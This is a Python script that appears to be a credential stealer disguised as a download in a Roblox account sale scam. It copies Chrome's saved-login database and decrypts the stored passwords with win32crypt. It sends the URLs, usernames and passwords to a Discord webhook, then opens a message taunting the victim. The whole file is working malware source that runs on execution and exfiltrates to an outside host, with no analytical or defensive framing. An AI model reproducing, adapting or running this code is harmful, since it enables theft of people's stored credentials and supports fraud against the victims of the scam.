#Made by the meme factory
#Copyright 2018

#Imports
import os
import sqlite3
import win32crypt
import sys
import shutil
import urllib.request
import json
import time
import subprocess

#Variables
message = """
Did you really think anyone would sell a roblox account for 5$ with escrow?
That was really fucking stupid,
didn't your mommy tell you not to download suspicious files?
You're fucked,
you don't even know it yet.
Me and my friends are gonna blow all your money on bullshit,
and hopefully you fucking learn.
"""

#Classes
class Webhook:
	def __init__(self,id,token):
		self.id = id
		self.token = token
		self.url = "https://discordapp.com/api/webhooks/" + id + "/" + token
	def send(self,msg,embed=None):
		if embed != None:
			data = {
				"content": msg,
				"embeds": [
					embed
				]
			}
		else:
			data = {"content": msg}

		req = urllib.request.Request(self.url)
		req.add_header("Content-Type","application/json; charset=utf-8")
		jsondata = json.dumps(data)
		requestbytes = jsondata.encode("utf-8")
		req.add_header("Content-Length",len(requestbytes))
		req.add_header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36")
		res = urllib.request.urlopen(req,requestbytes)

class SQLite3connection:
	def __init__(self,path):
		try:
			self.connection = sqlite3.connect(path)
			self.cursor = self.connection.cursor()
		except:
			sys.exit()
	def run(self,query):
		self.cursor.execute(query)
		return self.cursor.fetchall()
	def close(self):
		self.connection.close()

class PasswordStealer:
	def __init__(self):
		src = os.path.realpath(os.getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data")
		copy = shutil.copy(src,os.getenv("USERPROFILE") + "\\Desktop\\stealer.bak")
		self.path = copy
		self.connection = SQLite3connection(self.path)
	def steal(self):
		data = self.connection.run("SELECT action_url, username_value, password_value FROM logins")
		stolen = []
		if len(data) > 0:
			for result in data:
				url = result[0]
				username = result[1]
				try:
					password = win32crypt.CryptUnprotectData(result[2],None,None,None,0)[1]
				except:
					print("nopass")
					pass
				if password:
					stolen.append({
						"url": url,
						"username": username,
						"password": password
					})
		else:
			sys.exit()
		self.connection.close()
		os.remove(self.path)
		return stolen

#Functions
def opentext(text):
	file = open("msg.txt","w+")
	file.write(text)
	os.startfile("msg.txt")

def init():
	webhook = Webhook("id","token")
	stealer = PasswordStealer()
	passwords = stealer.steal()
	fields = []
	for password in passwords:
		fields.append({
			"name": "**" + str(password["url"]) + "**",
			"value": "**Username: **" + str(password["username"]) + "\n**Password: **" + str(password["password"])
		})
	webhook.send("Stolen passwords",embed={
		"title": "Passwords stolen from some idiot",
		"fields": fields,
		"footer": {
			"text": "Made by the meme factory"
		}
	})
	opentext(message)

#Init
init()
